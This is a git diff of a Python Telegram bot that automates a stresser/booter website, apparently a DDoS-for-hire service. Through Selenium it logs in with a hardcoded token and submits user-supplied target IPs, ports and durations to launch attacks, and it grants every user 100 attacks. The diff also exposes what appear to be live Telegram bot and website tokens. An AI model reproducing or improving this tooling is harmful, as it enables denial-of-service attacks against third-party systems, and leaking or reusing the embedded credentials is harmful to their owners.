@@ -19,7 +19,7 @@ import asyncio
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-BOT_TOKEN = "8546917231:AAGcX0usq9jvR3sOlOQ39Y5xdmjHrda2yL4"
+BOT_TOKEN = "8546917231:AAH12SjiIw3Yk6zCKdE2s0Vc9QNrRfRhXpk"
 WEBSITE_URL = "https://satellitestress.st/attack"
 LOGIN_URL = "https://satellitestress.st/login"
 WEBSITE_TOKEN = "622de40ac2335a06b834fad06a24c42dcfdc7423b93d35a5add017c08c10db37"
@@ -40,7 +40,7 @@ def save_attacks(data):
 
 attacks = load_attacks()
 
-# ==================== FIREFOX ATTACK FUNCTION ====================
+# ==================== FIXED ATTACK FUNCTION ====================
 def launch_attack(ip, port, duration):
     driver = None
     try:
@@ -50,7 +50,7 @@ def launch_attack(ip, port, duration):
         service = Service(GeckoDriverManager().install())
         driver = webdriver.Firefox(service=service, options=options)
         
-        # Login first
+        # ===== LOGIN =====
         driver.get(LOGIN_URL)
         wait = WebDriverWait(driver, 10)
         
@@ -58,6 +58,7 @@ def launch_attack(ip, port, duration):
         token_field.clear()
         token_field.send_keys(WEBSITE_TOKEN)
         
+        # Check for CAPTCHA
         try:
             captcha = driver.find_element(By.NAME, "captcha")
             return False, "CAPTCHA_REQUIRED"
@@ -68,41 +69,57 @@ def launch_attack(ip, port, duration):
         login_btn.click()
         time.sleep(3)
         
-        # Go to attack page
+        # ===== ATTACK PAGE =====
         driver.get(WEBSITE_URL)
-        wait = WebDriverWait(driver, 10)
-        
-        # 🔥 EXACT PLACEHOLDER-BASED SELECTORS 🔥
-        ip_field = wait.until(EC.presence_of_element_located(
-            (By.XPATH, "//input[@placeholder='104.29.138.132']")
-        ))
-        ip_field.clear()
-        ip_field.send_keys(ip)
-        
-        port_field = driver.find_element(
-            By.XPATH, "//input[@placeholder='80']"
-        )
-        port_field.clear()
-        port_field.send_keys(str(port))
-        
-        duration_field = driver.find_element(
-            By.XPATH, "//input[@placeholder='60']"
-        )
-        duration_field.clear()
-        duration_field.send_keys(str(duration))
-        
-        # Click launch
-        launch_btn = driver.find_element(By.XPATH, "//button[contains(text(), 'Launch')]")
-        launch_btn.click()
         time.sleep(3)
         
-        return True, "SUCCESS"
+        # 🔥 DEBUG: Save page source
+        with open("debug_page.html", "w", encoding="utf-8") as f:
+            f.write(driver.page_source)
+        print("✅ Page source saved to debug_page.html")
         
+        # 🔥 DEBUG: Print all inputs
+        all_inputs = driver.find_elements(By.TAG_NAME, "input")
+        print(f"\n🔍 Found {len(all_inputs)} input fields:")
+        for i, inp in enumerate(all_inputs):
+            print(f"  Input {i}: placeholder='{inp.get_attribute('placeholder')}', type='{inp.get_attribute('type')}'")
+        
+        # ===== FILL FORM =====
+        if len(all_inputs) >= 5:
+            # IP field (index 2)
+            all_inputs[2].clear()
+            all_inputs[2].send_keys(ip)
+            print(f"✅ IP entered: {ip}")
+            
+            # Port field (index 3)
+            all_inputs[3].clear()
+            all_inputs[3].send_keys(str(port))
+            print(f"✅ Port entered: {port}")
+            
+            # Duration field (index 4)
+            all_inputs[4].clear()
+            all_inputs[4].send_keys(str(duration))
+            print(f"✅ Duration entered: {duration}")
+            
+            # ===== LAUNCH BUTTON =====
+            buttons = driver.find_elements(By.TAG_NAME, "button")
+            for btn in buttons:
+                if "Launch" in btn.text:
+                    btn.click()
+                    print("✅ Launch button clicked")
+                    break
+            
+            time.sleep(3)
+            return True, "SUCCESS"
+        else:
+            return False, f"❌ Sirf {len(all_inputs)} inputs mile (5 expected)"
+            
     except Exception as e:
         return False, str(e)
     finally:
         if driver:
             driver.quit()
+
 # ==================== TELEGRAM HANDLERS ====================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = [[KeyboardButton("🎯 Launch Attack")]]
@@ -235,8 +252,12 @@ def main():
     app.add_handler(CallbackQueryHandler(button_callback))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     
+    print("="*50)
     print("🔥 FIREFOX ATTACK BOT STARTED")
+    print("="*50)
     print(f"👤 Everyone gets 100 attacks")
+    print(f"🔑 Token: {WEBSITE_TOKEN[:15]}...")
+    print("="*50)
     
     app.run_polling()
 
